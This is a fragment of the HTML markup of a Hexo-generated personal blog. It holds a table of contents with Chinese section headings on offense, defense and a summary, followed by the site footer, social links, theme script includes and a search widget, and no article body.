      <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#关于进攻"><span class="toc-text">关于进攻</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#关于防御"><span class="toc-text">关于防御</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#总结"><span class="toc-text">总结</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#广告"><span class="toc-text">广告</span></a></li></ol></li></ol>
    </div>
  </aside>



  


        </div>
      </main>

      <footer class="footer syuanpi fadeIn" id="footer">
  <hr>
  <div class="footer-wrapper">
    <div class="left">
      <div class="contact-icon">
    
    
    
    
    
    
    
    
    
        
        
        
        
        
            <a href="https://www.facebook.com/dong.yifan.1" class="iconfont icon-social-facebook" title="facebook"></a>
        
        
        
        
    
        
        
        
            <a href="https://twitter.com/dong_yifan" class="iconfont icon-social-twitter" title="twitter"></a>
        
        
        
        
        
        
    
        
        
        
        
            <a href="https://www.zhihu.com/people/aurora-56-20/activities" class="iconfont icon-zhihu" title="zhihu"></a>
        
        
        
        
        
    
        
            <a href="https://github.com/Explainaur" class="iconfont icon-social-github" title="github"></a>
        
        
        
        
        
        
        
        
    
</div>

    </div>
    <div class="right">
      <div class="copyright">
    <div class="info">
        <span>&copy;</span>
        <span>2016 ~ 2020</span>
        <span>❤</span>
        <span>dyf</span>
    </div>
    <div class="theme">
        <span>
            Powered by
            <a href="http://hexo.io/" target="_blank">Hexo </a>
        </span>
        <span>
            Theme
            <a href="https://github.com/ColMugX/hexo-theme-Nlvi"> Nlvi </a>
        </span>
    </div>
    
</div>

    </div>
  </div>
</footer>
    </div>
  </div>
  <script src="/script/lib/jquery/jquery-3.2.1.min.js"></script>


  <script src="/script/lib/lightbox/js/lightbox.min.js"></script>








<script src="/script/src/nlvi.js"></script>

  <script src="/script/scheme/banderole.js"></script>

<script src="/script/bootstarp.js"></script>


<div class="backtop syuanpi melt toTop" id="backtop">
    <i class="iconfont icon-up"></i>
    <span style="text-align:center;font-family:Georgia;"><span style="font-family:Georgia;" id="scrollpercent">1</span>%</span>
</div>


  <div class="search" id="search">
    <div class="mask" id="mask"></div>
    <div class="search-wrapper syuanpi">
      <h2 id="search-header" class="syuanpi">Search？</h2>
      <div class="input">
        <input type="text" id="local-search-input" results="0" name>
      </div>
      <div id="local-search-result"></div>
    </div>
  </div>


</body>
</html>
